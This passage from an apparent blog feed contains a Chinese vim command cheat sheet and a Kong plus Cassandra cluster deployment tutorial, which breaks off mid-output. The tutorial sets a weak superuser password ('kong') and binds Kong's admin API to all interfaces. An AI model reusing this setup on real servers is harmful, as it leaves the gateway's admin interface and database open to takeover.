    <content type="html"><![CDATA[<h2 id="vim使用技巧"><a href="#vim使用技巧" class="headerlink" title="vim使用技巧"></a>vim使用技巧</h2><h3 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h3><hr><ul><li>单行移动</li></ul><table><thead><tr><th>w</th><th>移动光标到下一个单词开头</th></tr></thead><tbody><tr><td>W</td><td>移动光标到下一个单词开头，长跳．比如／etc/letsencryt 被认为是一个单词</td></tr><tr><td>e</td><td>移动光标到下一个单词结尾</td></tr><tr><td>E</td><td>移动光标到下一个单词结尾,长跳</td></tr><tr><td>b</td><td>移动光标到上一个单词</td></tr><tr><td>B</td><td>移动光标到上一个单词,长跳</td></tr><tr><td>nw</td><td>n代表数字,比如移动到下5个单词的头部,5w</td></tr><tr><td>ne</td><td>n代表数字,比如移动到下5个单词的尾部,5e</td></tr></tbody></table><a id="more"></a><ul><li>行首行尾移动</li></ul><table><thead><tr><th>0</th><th>数字0,表示移动到本行最开头,不管有没有缩进都跳到最开头,作用等用于Home键</th></tr></thead><tbody><tr><td>^</td><td>移动光标到本行最开头的字符处</td></tr><tr><td>$</td><td>移动到本行结尾处.作用等同于End键</td></tr></tbody></table><ul><li>屏幕中移动</li></ul><table><thead><tr><th>H</th><th>移动光标到屏幕的首行.注意是当前屏幕窗口,而不是整个文件.</th></tr></thead><tbody><tr><td>M</td><td>移动光标到屏幕的中间一行.</td></tr><tr><td>L</td><td>移动光标到屏幕的尾行.</td></tr></tbody></table><ul><li>文件范围移动</li></ul><table><thead><tr><th>gg</th><th>移动光标到文件首行.这个是移动到整个文件的第一行</th></tr></thead><tbody><tr><td>G</td><td>移动光标到文件的最后一行. 这个是移动到整个文件的最后一行</td></tr><tr><td>:n</td><td>跳到第n行.比如跳到第5行,可以输入:5</td></tr><tr><td>nG或ngg</td><td>也是跳到n行,比如跳到第10行,输入10G,或者10gg</td></tr><tr><td>:n</td><td>n代表数字,比如移动到100行,输入:100</td></tr></tbody></table><ul><li>翻页</li></ul><table><thead><tr><th>ctrl+f</th><th>向下翻页,等同于page down</th></tr></thead><tbody><tr><td>ctrl+b</td><td>向上翻页,等同于page up</td></tr><tr><td>ctrl+d</td><td>向下翻半页</td></tr><tr><td>ctrl+u</td><td>向上翻半页</td></tr></tbody></table><ul><li>特殊移动技巧</li></ul><table><thead><tr><th>{</th><th>跳到上一个空行</th></tr></thead><tbody><tr><td>}</td><td>跳到下一个空行</td></tr><tr><td>*</td><td>将光标停留在某个单词上，按下＊键，会搜索该单词，并跳到下一个这个单词处</td></tr><tr><td>#</td><td>将光标停留在某个单词上，按下#键，会搜索该单词，并跳到上一个这个单词处</td></tr><tr><td>‘’</td><td>两个单引号,移动光标到上一个标记处.比如跳转到他处后,输入此命令回到上一次光标停留的位置</td></tr><tr><td>‘.</td><td>一个单引号一个点，移动光标到上一次的修改行</td></tr><tr><td>`.</td><td>一个倒引号一个点．移动光标到上一次的修改点</td></tr></tbody></table><hr><h3 id="删除复制—结合光标"><a href="#删除复制—结合光标" class="headerlink" title="删除复制—结合光标"></a>删除复制—结合光标</h3><p>在vim中,y表示拷贝,d表示删除,p表示粘贴.其中拷贝和删除和光标移动命令可以结合使用</p><ul><li>删除</li></ul><table><thead><tr><th>dw</th><th>w是移动到下一个单词开头．dw表示删除从当前光标到光标所在单词结尾的内容</th></tr></thead><tbody><tr><td>dW</td><td>同上，不过是长删除, /etc/letsencrypt被认为是一个单词</td></tr><tr><td>daw</td><td>删除光标所在的单词,无论光标是停留在哪里.例如/etc/letsencrypt/.如果光标停留在letsencrypt中的t字母上,则会删除letsencrypt这个单词.如果是dw则只删除tsencrypt,保留le</td></tr><tr><td>daW</td><td>同上，长删除</td></tr><tr><td>d0</td><td>数字0,删除从当前光标到光标所在行首的内容</td></tr><tr><td>d$或dD</td><td>删除从当前光标到光标所在行尾的内容</td></tr></tbody></table><ul><li>复制</li></ul><table><thead><tr><th>yw</th><th>同理,复制从光标所在字母到单词结尾的内容</th></tr></thead><tbody><tr><td>yW</td><td>同上,长复制</td></tr><tr><td>yaw/yaW</td><td>同理，复制单词，无论光标停留在单词的哪个字母</td></tr><tr><td>y0</td><td>拷贝从当前光标到光标所在行首的内容，如果该行缩进，那么连行首的空格也一起复制</td></tr><tr><td>ｙ^</td><td>拷贝从当前光标到光标所在行首的内容，如果该行缩进，不包括行首空格，</td></tr><tr><td>y$</td><td>拷贝从当前光标到光标所在行尾的内容</td></tr></tbody></table><ul><li>整行复制删除</li></ul><table><thead><tr><th>yy</th><th>复制光标所在整行内容</th></tr></thead><tbody><tr><td>dd</td><td>删除光标所在整行内容</td></tr><tr><td>D</td><td>删除从当前光标到光标所在行尾的内容</td></tr><tr><td>J</td><td>表示光标所在行和下一行合并</td></tr><tr><td>:.,$d</td><td>删除当前行到文件末尾,</td></tr><tr><td>dG</td><td>删除当前行到文件末尾,</td></tr><tr><td>:/str1/,/str2/d</td><td>删除从字符串str1到str2的所有行</td></tr></tbody></table><hr><h3 id="删除复制—结合数字"><a href="#删除复制—结合数字" class="headerlink" title="删除复制—结合数字"></a>删除复制—结合数字</h3><table><thead><tr><th>5yy或者y5y</th><th>拷贝光标以下5行,包含光标所在行本身</th></tr></thead><tbody><tr><td>:n1,n2y</td><td>n表示数字,例如:12,24y表示拷贝第12行到第24行的内容.</td></tr><tr><td>:n,y</td><td>n表示数字,例如:12,y表示拷贝第12行到光标所在行之间的内容.</td></tr><tr><td>:,ny</td><td>n表示数字,例如:,24y表示拷贝光标所在行到第24行之间的内容.</td></tr></tbody></table><table><thead><tr><th>5dd或者d5d</th><th>删除光标以下5行,包含光标所在行本身</th></tr></thead><tbody><tr><td>:n1,n2d</td><td>n表示数字,例如:12,24d表示删除第12行到第24行的内容.</td></tr><tr><td>:n,d</td><td>n表示数字,例如:12,d表示删除第12行到光标所在行之间的内容.</td></tr><tr><td>:,nd</td><td>n表示数字,例如:,24d表示删除光标所在行到第24行之间的内容.</td></tr><tr><td>:nd</td><td>n表示数字,例如:3d表示删除3行.注意和上个命令区分</td></tr></tbody></table><hr><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><table><thead><tr><th>/xxx或者?xxx</th><th>在整篇文档中搜索匹配xxx的字符串, / 表示向下查找, ? 表示向上查找.支持正则表达式.输入 n 查找下一个匹配处, 输入 N 反方向查找.注意查找字符串默认区分大小写</th></tr></thead><tbody><tr><td>*或者#</td><td>光标停留在某个单词上时, 输入这条命令表示查找与该单词匹配的下(上)一个单词,同样,输入n查找下一个匹配,输入N反方向查找</td></tr><tr><td>g*或者g#</td><td>和上条相似,但是这个命令不完全匹配光标所在处的单词,而是匹配包含该单词的所有字符串</td></tr><tr><td>gd</td><td>查找与光标所在单词相匹配的单词, 并将光标停留在文档的非注释段中第一次出现这个单词的地方. 用于查找局部变量等</td></tr><tr><td>%</td><td>查找与光标所在处相匹配的反括号, 包括 () [] { }</td></tr></tbody></table><hr><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p>一般结合s和g命令进行替换.一般格式为:  </p><p>:%s/匹配模式/替换后的字符串/g.其中模式可以是正则表达式,以下是几个例子</p><table><thead><tr><th>:s/aa/bb/g</th><th>将光标所在行出现的所有包含 aa 的字符串中的 aa 替换为 bb.注意是光标所在行,不是全文件</th></tr></thead><tbody><tr><td>:%s/aa/bb/g</td><td>将文档中出现的所有包含 aa 的字符串中的 aa 替换为 bb.文件全局生效</td></tr><tr><td>:12,23s/aa/bb/g</td><td>将从12行到23行中出现的所有包含 aa 的字符串中的 aa 替换为 bb</td></tr><tr><td>:12,23s/^/#/</td><td>将从12行到23行的行首加入 # 字符</td></tr><tr><td>:s/^/#/g</td><td>全局所有行首插入#字符</td></tr></tbody></table><blockquote><p>还有一个方法可以批量在行首插入字符:</p></blockquote><p>1.ctrl+v批量选中要插入的行</p><p>2.按大写字母I,输入要插入的字符</p><p>3.连续按两次ESC键</p><table><thead><tr><th>:%s/\s+$//</th><th>将所有行尾多余的空格删除.等同于”:%s= *$==”</th></tr></thead><tbody><tr><td>:g/^\s*$/d</td><td>将所有空行删除</td></tr><tr><td>:g/^\/\//d</td><td>将所有//开头的行整行删除.(不仅仅是删除//)</td></tr></tbody></table><blockquote><p>s配合g一般用来做替换,g单独使用一般用来删除匹配的行</p></blockquote><hr><h3 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h3><table><thead><tr><th>cc</th><th>删除当前行并进入编辑模式</th></tr></thead><tbody><tr><td>cw</td><td>删除当前字，并进入编辑模式</td></tr><tr><td>c$</td><td>擦除从当前位置至行末的内容，并进入编辑模式</td></tr><tr><td>S</td><td>删除光标所在行并进入编辑模式</td></tr><tr><td>s</td><td>删除当前字符并进入编辑模式</td></tr><tr><td>u</td><td>撤销</td></tr><tr><td>ctrl+r</td><td>撤销上一个撤销.</td></tr><tr><td>~</td><td>将光标当前选中的字符切换大小写</td></tr><tr><td>&gt;&gt;</td><td>当前行右移一个tab</td></tr><tr><td>&lt;&lt;</td><td>当前行左移一个 tab</td></tr><tr><td>5&gt;&gt;</td><td>当前光标后5 行向右移动一个 tab.</td></tr><tr><td>:12,24&gt;</td><td>将12行到14行的数据都向右移动一个 tab</td></tr><tr><td>:12,24&gt;&gt;</td><td>将12行到14行的数据都向右移动两个 tab</td></tr><tr><td>:w filename</td><td>将当前文件所有内容写入新文件</td></tr><tr><td>:5w filenmame</td><td>将当前文件第5行内容写入新文件</td></tr><tr><td>:1,10w filename</td><td>将当前文件第1到第10行内容写入新文件</td></tr><tr><td>:f filename</td><td>将当前文件重命名为新文件</td></tr></tbody></table><hr><h3 id="多文件编辑"><a href="#多文件编辑" class="headerlink" title="多文件编辑"></a>多文件编辑</h3><table><thead><tr><th>vim file1 file2 …</th><th>同时打开多个文件进行编辑</th></tr></thead><tbody><tr><td>:n\:N (等同于:next\:prev)</td><td>进入下一个文件(上一个文件)编辑.这个命令要求先保存当前编辑文件</td></tr><tr><td>:n!\:N!</td><td>不保存当前编辑文件,并且切换到下(上)文件编辑.</td></tr><tr><td>:wn\wN</td><td>保存当前编辑文件,并且切换到下(上)文件编辑</td></tr><tr><td>ctrl+^</td><td>在最近打开的2个文件之间快速切换</td></tr><tr><td>:e 文件名</td><td>指定对某个文件进行编辑</td></tr><tr><td>:sp [file]</td><td>把当前文件或者指定文件水平分隔</td></tr><tr><td>:vsp [file]</td><td>把当前文件或者指定文件垂直分隔</td></tr><tr><td>:q\:close</td><td>关闭当前文件窗口</td></tr><tr><td>:only</td><td>只保留当前文件窗口,关闭其他所有窗口</td></tr><tr><td>:[q\</td><td>wq]all</td><td>对所有窗口执行q或者wq操作</td></tr><tr><td>:[q\</td><td>wq]all!</td><td>对所有窗口执行q!或者wq!操作</td></tr><tr><td>:vertical all</td><td>打开所有窗口,垂直打开</td></tr><tr><td>ctrl+w  w</td><td>vim分隔了多个窗口后,光标循环定位到各个窗口中</td></tr><tr><td>ctrl+w h/i</td><td>vim分隔了多个窗口后,光标跳转到左边(右边)的窗口</td></tr><tr><td>ctrl+w j/k</td><td>vim分隔了多个窗口后,光标跳转到上边(下边)的窗口</td></tr><tr><td>ctrl+W =</td><td>让所有vim分隔后的多个窗口高度保持一样</td></tr><tr><td>ctrl+W +/-</td><td>增加/减少vim当前窗口高度</td></tr></tbody></table><hr><h3 id="执行外部shell命令"><a href="#执行外部shell命令" class="headerlink" title="执行外部shell命令"></a>执行外部shell命令</h3><table><thead><tr><th>:! command</th><th>这是比较常用的执行命令方式,比如 :!ls 显示当前目录下的文件.执行完命令后按回车返回vim编辑窗口</th></tr></thead><tbody><tr><td>:r! command</td><td>比如:r!ls.和上面的命令类似,但是执行完的结果会保存在vim的缓存中,一直显示在当前vim编辑窗口</td></tr></tbody></table><hr><h3 id="常用功能选项"><a href="#常用功能选项" class="headerlink" title="常用功能选项"></a>常用功能选项</h3><p>在启动的时候vim会读取 /etc/vimrc 和 ~/.vimrc ( 全局设置的vimrc 和用户设置).下面这些常见的功能选项可以直接定义在vimrc文件里,也可以在vim编辑窗口中输入: set xxx执行.</p><p>常见的功能选项有:</p><table><thead><tr><th>:set nu/:set nonu</th><th>显示/取消行号.nu是number的缩写</th></tr></thead><tbody><tr><td>:set ic/set noic</td><td>显示/忽略大小写.ic是ignorecace的缩写</td></tr><tr><td>:set ai/set noai</td><td>自动/不自动缩进.ai是aotuindent缩写</td></tr><tr><td>:set hlsearch/:set nohlsearch</td><td>显示/不显示高亮.</td></tr><tr><td>:syntax on / :syntax off</td><td>语法高亮/关闭语法高亮</td></tr><tr><td>set tabstop=4</td><td>设置tab键为4个空格</td></tr><tr><td>set ruler</td><td>在右下角显示光标位置的状态行</td></tr><tr><td>set incsearch</td><td>查询的时候非常方便.比如搜索book单词.输入/bo时,就已经自动开始查找.</td></tr><tr><td>set noswapfile</td><td>不要交换文件</td></tr></tbody></table><hr><h3 id="粘贴避免缩进"><a href="#粘贴避免缩进" class="headerlink" title="粘贴避免缩进"></a>粘贴避免缩进</h3><p>1.在粘贴之前,vim窗口中输入:set paste #vim就不会自动缩进,而是纯拷贝粘贴<br>2.在粘贴之后,vim窗口中输入:set nopaste #关闭paste</p><p>还有一种方法是,即使粘贴后代码格式变的非常慢,只要执行gg=G就能自动编排格式.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;vim使用技巧&quot;&gt;&lt;a href=&quot;#vim使用技巧&quot; class=&quot;headerlink&quot; title=&quot;vim使用技巧&quot;&gt;&lt;/a&gt;vim使用技巧&lt;/h2&gt;&lt;h3 id=&quot;移动光标&quot;&gt;&lt;a href=&quot;#移动光标&quot; class=&quot;headerlink&quot; title=&quot;移动光标&quot;&gt;&lt;/a&gt;移动光标&lt;/h3&gt;&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;单行移动&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;w&lt;/th&gt;
&lt;th&gt;移动光标到下一个单词开头&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;W&lt;/td&gt;
&lt;td&gt;移动光标到下一个单词开头，长跳．比如／etc/letsencryt 被认为是一个单词&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;e&lt;/td&gt;
&lt;td&gt;移动光标到下一个单词结尾&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;E&lt;/td&gt;
&lt;td&gt;移动光标到下一个单词结尾,长跳&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;b&lt;/td&gt;
&lt;td&gt;移动光标到上一个单词&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;B&lt;/td&gt;
&lt;td&gt;移动光标到上一个单词,长跳&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;nw&lt;/td&gt;
&lt;td&gt;n代表数字,比如移动到下5个单词的头部,5w&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ne&lt;/td&gt;
&lt;td&gt;n代表数字,比如移动到下5个单词的尾部,5e&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
    
    </summary>
    
      <category term="Linux-Basic" scheme="https://jesse.top/categories/Linux-Basic/"/>
    
      <category term="文本处理" scheme="https://jesse.top/categories/Linux-Basic/%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86/"/>
    
    
      <category term="vim" scheme="https://jesse.top/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>kong+casssandra集群环境部署</title>
    <link href="https://jesse.top/2018/11/21/Linux-%E5%88%86%E5%B8%83%E5%BC%8F&amp;%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kong/kong+casssandra%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    <id>https://jesse.top/2018/11/21/Linux-分布式&amp;消息队列/kong/kong+casssandra集群环境部署/</id>
    <published>2018-11-20T21:22:58.000Z</published>
    <updated>2019-02-17T09:31:38.016Z</updated>
    
    <content type="html"><![CDATA[<h2 id="kong-casssandra集群环境部署"><a href="#kong-casssandra集群环境部署" class="headerlink" title="kong+casssandra集群环境部署"></a>kong+casssandra集群环境部署</h2><h3 id="kong简介"><a href="#kong简介" class="headerlink" title="kong简介"></a>kong简介</h3><p>Kong是Mashape开源的一款API网关，起初是用来管理 Mashape 公司15000个微服务的，后来在2015年开源,现在已经在很多创业公司、大型企业和政府机构中广泛使用。基于nginx,Lua和Cassandra或PostgreSQL，支持分布式操作，有很强的可移植性和可扩展性。可以在任何一种基础设施上运行,作为应用和API之间的中间层，加上众多功能强大的插件，可以实现认证授权、访问控制等功能。并且提供易于使用的RESTful API来操作和配置系统。</p><p>有关kong的详细介绍请参考官网.</p><a id="more"></a><p>–</p><h3 id="cassandra简介"><a href="#cassandra简介" class="headerlink" title="cassandra简介"></a>cassandra简介</h3><p>Cassandra 是一个来自 Apache 的分布式数据库，具有高度可扩展性，可用于管理大量的结构化数据。它提供了高可用性，没有单点故障。kong支持PostgreSQL或者Cassandra两种数据库.这里我们选择了cassandra.</p><p>有关cassandra的详细介绍和使用方法.请参考官网</p><p>–</p><h3 id="集群架构"><a href="#集群架构" class="headerlink" title="集群架构"></a>集群架构</h3><ul><li><strong>kong cluster</strong></li></ul><p>kong 集群并不意味着客户端请求将会负载均衡到kong集群中的每个节点上，kong集群并不是开箱即用，仍然需要在kong集群多节点上层搭建负载均衡，以便分发请求。 一个kong集群只是意味着集群内的节点，都共享同样的配置。</p><p>有关Kong cluster集群的详细介绍请参考官网:<a href="https://docs.konghq.com/0.14.x/clustering/" target="_blank" rel="noopener">Kong cluser document</a></p><p>为了提高冗余性和健壮性.我们对kong的每个环节都进行了冗余设计.一个基本的kong集群架构大概如下图所示:</p><p><img src="http://pabkmteb4.bkt.clouddn.com/kong-flow.png" alt=""></p><p>–</p><h3 id="部署步骤"><a href="#部署步骤" class="headerlink" title="部署步骤"></a>部署步骤</h3><p><strong>环境</strong>: </p><p>阿里云ECS Centos7.4操作系统<br>Kong: 0.14 最新版<br>Cassandra: 3.11 最新版</p><p>–</p><h4 id="安装Cassandra"><a href="#安装Cassandra" class="headerlink" title="安装Cassandra"></a>安装Cassandra</h4><p>安装方式官网参考: <a href="http://cassandra.apache.org/doc/latest/getting_started/installing.html#installation-from-binary-tarball-files" target="_blank" rel="noopener">Installing Cassandra</a></p><p><strong>安装前提条件</strong></p><p>1.安装JDK 8版本<br>2.安装2.7以上版本的Python.(cassandra管理工具:cqlsh 需要python2.7以上环境)</p><p><strong>安装步骤</strong></p><p>1.下载cassandra二进制文件.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://mirrors.tuna.tsinghua.edu.cn/apache/cassandra/3.11.3/apache-cassandra-3.11.3-bin.tar.gz</span><br></pre></td></tr></table></figure><p>2.将cassandra目录添加进环境变量.用work用户运行cassandra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /usr/local/cassandra</span><br><span class="line">sudo chown -R work:work /usr/local/cassandra</span><br><span class="line">sudo tar -xvf apache-cassandra-3.11.3-bin.tar.gz -C /usr/local/cassandra</span><br><span class="line"></span><br><span class="line">cd /usr/local/cassandra</span><br><span class="line">sudo mv apache-cassandra-3.11.3/* .</span><br><span class="line">sudo rm apache-cassandra-3.11.3/ -rf</span><br></pre></td></tr></table></figure><p>添加进环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br><span class="line"></span><br><span class="line">export JAVA_HOME=/usr/local/java</span><br><span class="line">export CASSANDRA_HOME=/usr/local/cassandra</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin:$CASSANDRA_HOME/bin</span><br></pre></td></tr></table></figure><p>–</p><h4 id="配置Cassandra-以及cassandra集群"><a href="#配置Cassandra-以及cassandra集群" class="headerlink" title="配置Cassandra,以及cassandra集群"></a>配置Cassandra,以及cassandra集群</h4><p>1.编辑cassandra的cassandra.yml配置文件.修改下列配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 kong]$ vim /usr/local/cassandra/conf/cassandra.yaml</span><br><span class="line"></span><br><span class="line">#定义Cassandra集群名</span><br><span class="line">cluster_name: &apos;dwd_cassandra&apos;</span><br><span class="line">#定义hints路径.可以使用默认路径</span><br><span class="line">hints_directory: /data/cassandra/hints</span><br><span class="line"></span><br><span class="line">#采用密码方式连接数据库.默认情况下不需要任何用户密码就可以登录数据库</span><br><span class="line">authenticator: PasswordAuthenticator</span><br><span class="line"></span><br><span class="line">#定义数据库文件路径.可以使用默认/var/lib路径</span><br><span class="line">data_file_directories:</span><br><span class="line">      - /data/cassandra</span><br><span class="line"></span><br><span class="line">#定义commit日志路径.可以使用默认路径</span><br><span class="line">commitlog_directory: /data/cassandra/commitlog</span><br><span class="line"></span><br><span class="line">#缓存文件路径</span><br><span class="line">saved_caches_directory: /data/cassandra/saved_caches</span><br><span class="line"></span><br><span class="line">#关键配置,定义集群种子服务器地址.这里定义服务器的内网地址.不能使用0.0.0.0或者127的本机地址,可以加入多个集群节点的地址,IP地址之间用逗号分隔</span><br><span class="line">- seeds: &quot;10.25.87.159&quot;</span><br><span class="line"></span><br><span class="line">#listen地址</span><br><span class="line">listen_address: 10.25.87.159</span><br><span class="line"></span><br><span class="line">#rpc地址</span><br><span class="line">rpc_address: 10.25.87.159</span><br></pre></td></tr></table></figure><p>2.创建刚才定义的路径目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -pv /data/cassandra </span><br><span class="line">sudo chown -R work.work /data/</span><br></pre></td></tr></table></figure><p>3.启动cassandra.直接在命令行执行cassandra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 kong]$ cassandra </span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">[work@kong-node1 kong]$ /usr/local/cassandra/bin/cassandra</span><br></pre></td></tr></table></figure><ol start="4"><li>使用cqlsh工具登陆cassandra数据库.创建cassandra用户密码,以及创建键空间</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#注意由于cassandra只侦听了内网的地址,因此要指定IP地址.</span><br><span class="line">#默认账号密码都是cassandra</span><br><span class="line">[work@kong-node1 kong]$ cqlsh 10.25.87.159  -ucassandra -pcassandra </span><br><span class="line"></span><br><span class="line">#创建一个kong用户.并且为超级用户</span><br><span class="line">cassandra@cqlsh&gt; create user kong with password &apos;kong&apos; superuser;</span><br><span class="line"></span><br><span class="line">#创建一个keyspace.命名为kong</span><br><span class="line">cassandra@cqlsh&gt; CREATE KEYSPACE kong WITH REPLICATION = &#123; &apos;class&apos; : &apos;SimpleStrategy&apos;, &apos;replication_factor&apos; : 1&#125;;</span><br><span class="line"></span><br><span class="line">cassandra@cqlsh&gt; exit</span><br></pre></td></tr></table></figure><p>5.删除自带的cassandra用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 cassandra]$ cqlsh 10.25.87.159  -ukong -pkong</span><br><span class="line">kong@cqlsh&gt; desc kong;</span><br><span class="line"></span><br><span class="line">CREATE KEYSPACE kong WITH replication = &#123;&apos;class&apos;: &apos;SimpleStrategy&apos;, &apos;replication_factor&apos;: &apos;1&apos;&#125;  AND durable_writes = true;</span><br><span class="line"></span><br><span class="line">kong@cqlsh&gt; drop user cassandra;</span><br></pre></td></tr></table></figure><p>–</p><h4 id="安装Kong"><a href="#安装Kong" class="headerlink" title="安装Kong"></a>安装Kong</h4><p>安装方法可以参考官网:<a href="https://docs.konghq.com/install/centos/?_ga=2.110797315.728319704.1539597667-917309945.1539077269#packages" target="_blank" rel="noopener">Install Kong</a></p><p>1.下载,安装rpm安装包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget -O kong-community-edition-0.14.1.el7.noarch.rpm  https://bintray.com/kong/kong-community-edition-rpm/download_file?file_path=centos/7/kong-community-edition-0.14.1.el7.noarch.rpm</span><br><span class="line"></span><br><span class="line">sudo yum install epel-release</span><br><span class="line">sudo yum install kong-community-edition-0.14.1.el7.noarch.rpm</span><br></pre></td></tr></table></figure><p>2.修改配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/kong</span><br><span class="line">sudo cp kong.conf.default kong.conf</span><br><span class="line"></span><br><span class="line">sudo vim kong.conf</span><br><span class="line"></span><br><span class="line">#修改日志文件路径</span><br><span class="line">prefix = /data/kong/</span><br><span class="line"></span><br><span class="line">#由于磁盘空间有限,关闭kong的代理日志.后端真实服务器会记录nginx访问日志</span><br><span class="line">proxy_access_log = off</span><br><span class="line">proxy_error_log = off</span><br><span class="line"></span><br><span class="line">#在所有地址侦听管理端口,当然只侦听127地址会更安全.</span><br><span class="line">admin_listen = 0.0.0.0:8001, 0.0.0.0:8444 ssl</span><br><span class="line"></span><br><span class="line">#指定使用cassandra数据库</span><br><span class="line">database = cassandra</span><br><span class="line">#数据库地址,端口</span><br><span class="line">cassandra_contact_points = 10.25.87.159</span><br><span class="line">cassandra_port = 9042</span><br><span class="line"></span><br><span class="line">#上文定义的cassandra数据库的用户密码和键空间</span><br><span class="line">cassandra_keyspace = kong</span><br><span class="line">cassandra_username = kong</span><br><span class="line">cassandra_password = kong</span><br><span class="line"></span><br><span class="line">#kong官方建议的cassandra一致性机制</span><br><span class="line">cassandra_consistency = QUORUM</span><br><span class="line"></span><br><span class="line">#以下是集群的数据库和缓存方面的配置.详细介绍请参考官网</span><br><span class="line">db_update_frequency = 5</span><br><span class="line">db_update_propagation = 2</span><br></pre></td></tr></table></figure><p>3.创建kong目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /data/kong</span><br></pre></td></tr></table></figure><p>4.准备启动工作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kong migrations up -c /etc/kong/kong.conf</span><br></pre></td></tr></table></figure><p>5.启动kong</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kong start -c /etc/kong/kong.conf</span><br></pre></td></tr></table></figure><p>查看端口.可以看到cassandra和kong的侦听端口都已经成功启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">work@kong-node1 kong]$ netstat -tulnp</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:8443            0.0.0.0:*               LISTEN      29342/nginx: master</span><br><span class="line">tcp        0      0 0.0.0.0:8444            0.0.0.0:*               LISTEN      29342/nginx: master</span><br><span class="line">tcp        0      0 127.0.0.1:7199          0.0.0.0:*               